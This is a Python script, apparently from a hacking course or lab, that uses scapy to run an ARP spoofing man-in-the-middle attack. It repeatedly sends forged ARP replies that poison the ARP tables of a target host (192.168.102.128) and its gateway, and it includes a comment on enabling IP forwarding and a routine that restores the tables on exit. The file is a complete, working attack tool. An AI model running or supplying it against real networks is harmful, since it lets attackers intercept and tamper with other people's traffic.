#!/usr/bin/env python
from operator import truediv

import scapy.all as scapy
import time

 #echo 1 > /proc/sys/net/ipv4/ip_forward
def get_mac(ip):
    arp_request =scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #broadcast mac address
    arp_request_broadcast = broadcast/arp_request #forward slash allows to combine 2 packets into new one using scapy
    answered_list = scapy.srp(arp_request_broadcast, timeout =1, verbose=False)[0] # send packets wih custom mac, .sr function for  packets without custom mac. Response in form of 2 list answered, unanswered response and also add timeout.

    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst =target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet)

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac =get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc =source_mac)
    scapy.send(packet,count =4, verbose =False) #send 4 packets for redundancy

target_ip = "192.168.102.128"
gateway_ip = "192.168.102.2"
try:
    packet_count =0
    while True:
        spoof(gateway_ip,target_ip)
        spoof(target_ip,gateway_ip)
        packet_count += 2
        print("\r[+] Packets sent - "+str(packet_count), end = "") #python3 only, dynamic printing
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Resetting ARP tables ......... Please wait\n")
    restore(gateway_ip,target_ip)
    restore(target_ip,gateway_ip)


